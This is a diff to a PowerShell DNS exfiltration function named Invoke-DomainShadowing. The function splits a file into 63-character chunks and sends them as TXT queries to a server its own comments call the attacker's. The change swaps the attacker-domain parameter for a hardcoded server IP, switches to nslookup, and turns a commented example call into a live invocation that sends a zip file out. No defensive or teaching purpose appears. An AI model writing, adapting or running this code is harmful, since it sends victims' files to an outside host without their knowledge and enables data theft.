@@ -4,7 +4,7 @@ function Invoke-DomainShadowing {
         [string]$FilePath,
 
         [Parameter(Mandatory = $true)]
-        [string]$Domain  # Attacker's domain to receive the DNS queries
+        [string]$ServerAddress  # Attacker's server IP address
     )
 
     $ChunkSize = 63  # Hardcoded chunk size
@@ -39,13 +39,14 @@ function Invoke-DomainShadowing {
 
     # Send each chunk as a DNS query and log the results
     foreach ($chunk in $chunks) {
-        $query = "$($chunk.Index).$($chunk.Data).$Domain"
+        $query = "$($chunk.Index).$($chunk.Data).example.com"  # Modify as needed to create a valid DNS name format
         try {
-            $result = Resolve-DnsName -Type TXT -Name $query -Server $Domain
-            if ($result) {
-                Write-Output "Successfully sent chunk $($chunk.Index)"
+            # Using nslookup to send DNS query
+            $nslookupResult = nslookup -type=txt $query $ServerAddress
+            if ($nslookupResult -match "Non-existent domain|NXDOMAIN") {
+                Write-Output "Failed to send chunk $($chunk.Index): Non-existent domain"
             } else {
-                Write-Output "Failed to send chunk $($chunk.Index)"
+                Write-Output "Successfully sent chunk $($chunk.Index)"
             }
         } catch {
             Write-Output "Error sending chunk $($chunk.Index): $_"
@@ -54,4 +55,4 @@ function Invoke-DomainShadowing {
 }
 
 # Example usage
-# Invoke-DomainShadowing -FilePath "C:\path\to\your\file.zip" -Domain "attacker.example.com"
+Invoke-DomainShadowing -FilePath "C:\path\to\your\file.zip" -ServerAddress "172.21.55.115"
